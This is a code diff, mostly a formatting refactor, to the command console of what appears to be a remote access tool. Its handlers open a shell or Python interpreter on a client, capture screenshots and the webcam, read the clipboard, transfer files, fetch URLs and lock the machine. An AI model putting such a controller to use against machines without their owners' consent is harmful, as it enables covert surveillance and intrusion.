@@ -72,7 +72,8 @@ class ServerCLI(BaseServer, cmd.Cmd):
 
     def do_ping(self, _) -> None:
         """ Get client latency """
-        if self.__check_select(): return
+        if self.__check_select():
+            return
 
         try:
             latency = self.ping(self.client)
@@ -105,7 +106,7 @@ class ServerCLI(BaseServer, cmd.Cmd):
             return
 
         # Ensure clients don't get removed mid loop
-        clients = self.clients.copy()
+        clients = self.clients().copy()
 
         # Find a client.id starting with select_id, default None
         self.client = next((client for client in clients if client.id.startswith(select_id)), None)
@@ -127,13 +128,14 @@ class ServerCLI(BaseServer, cmd.Cmd):
 
     def do_list(self, _) -> None:
         """ CLI for list """
-        clients = self.list()
+        clients = self.clients()
         for client in clients:
             print(f'Port: {client.id} / Address: {client.address[0]}')
 
     def do_shell(self, _) -> None:
         """ Open a shell to client """
-        if self.__check_select(): return
+        if self.__check_select():
+            return
 
         # Fetch current working directory
         cwd = helpers.getcwd(self.client)
@@ -177,7 +179,8 @@ class ServerCLI(BaseServer, cmd.Cmd):
 
     def do_python(self, _) -> None:
         """ Open a python interpreter to client """
-        if self.__check_select(): return
+        if self.__check_select():
+            return
 
         logging.debug('Launched python interpreter (%s)', self.client.id)
         while True:
@@ -190,7 +193,8 @@ class ServerCLI(BaseServer, cmd.Cmd):
 
     def do_screenshot(self, _) -> None:
         """ Take a screenshot and save it in a file """
-        if self.__check_select(): return
+        if self.__check_select():
+            return
 
         try:
             filename = screenshot.screenshot(self.client)
@@ -201,7 +205,8 @@ class ServerCLI(BaseServer, cmd.Cmd):
 
     def do_webcam(self, _) -> None:
         """ Capture webcam """
-        if self.__check_select(): return
+        if self.__check_select():
+            return
 
         try:
             filename = webcam.webcam(self.client)
@@ -212,7 +217,8 @@ class ServerCLI(BaseServer, cmd.Cmd):
 
     def do_copy(self, _) -> None:
         """ Copy to client clipboard """
-        if self.__check_select(): return
+        if self.__check_select():
+            return
 
         text = input('Text to copy: ')
         try:
@@ -224,7 +230,8 @@ class ServerCLI(BaseServer, cmd.Cmd):
 
     def do_paste(self, _) -> None:
         """ Paste from client clipboard """
-        if self.__check_select(): return
+        if self.__check_select():
+            return
 
         try:
             content = clipboard.paste(self.client)
@@ -235,7 +242,8 @@ class ServerCLI(BaseServer, cmd.Cmd):
 
     def do_receive(self, _) -> None:
         """ Receive a file from the client """
-        if self.__check_select(): return
+        if self.__check_select():
+            return
 
         filename = input('File to transfer: ')
         save_name = input('Save file as: ')
@@ -248,7 +256,8 @@ class ServerCLI(BaseServer, cmd.Cmd):
 
     def do_send(self, _) -> None:
         """ Send a file to client """
-        if self.__check_select(): return
+        if self.__check_select():
+            return
 
         filename = input('Filename: ')
         save_name = input('Save file as: ')
@@ -265,7 +274,8 @@ class ServerCLI(BaseServer, cmd.Cmd):
 
     def do_download(self, _) -> None:
         """ Make the client download a file from the web """
-        if self.__check_select(): return
+        if self.__check_select():
+            return
 
         url = input('File URL: ')
         filename = input('Save file as: ')
@@ -278,7 +288,8 @@ class ServerCLI(BaseServer, cmd.Cmd):
 
     def do_lock(self, _) -> None:
         """ Lock client machine """
-        if self.__check_select(): return
+        if self.__check_select():
+            return
 
         try:
             windows.lock_machine(self.client)
@@ -289,14 +300,16 @@ class ServerCLI(BaseServer, cmd.Cmd):
 
     def do_tasks(self, _) -> None:
         """ Fetch all running tasks """
-        if self.__check_select(): return
+        if self.__check_select():
+            return
 
         self.client.tasklist = tasks.tasks(self.client)
         terminal.task_print(self.client.tasklist)
 
     def do_stoptask(self, task_id: str) -> None:
         """ Stop a task on a client """
-        if self.__check_select(): return
+        if self.__check_select():
+            return
 
         task_id = task_id.strip()
 
@@ -319,7 +332,8 @@ class ServerCLI(BaseServer, cmd.Cmd):
 
     def do_output(self, task_id: str) -> None:
         """ Given a task id, get output from finished task from client """
-        if self.__check_select(): return
+        if self.__check_select():
+            return
 
         task_id = task_id.strip()
 
@@ -342,7 +356,8 @@ class ServerCLI(BaseServer, cmd.Cmd):
 
     def do_disconnect(self, _) -> None:
         """ Disconnect a client """
-        if self.__check_select(): return
+        if self.__check_select():
+            return
 
         self.disconnect(self.client)
         print("Disconnected client.")
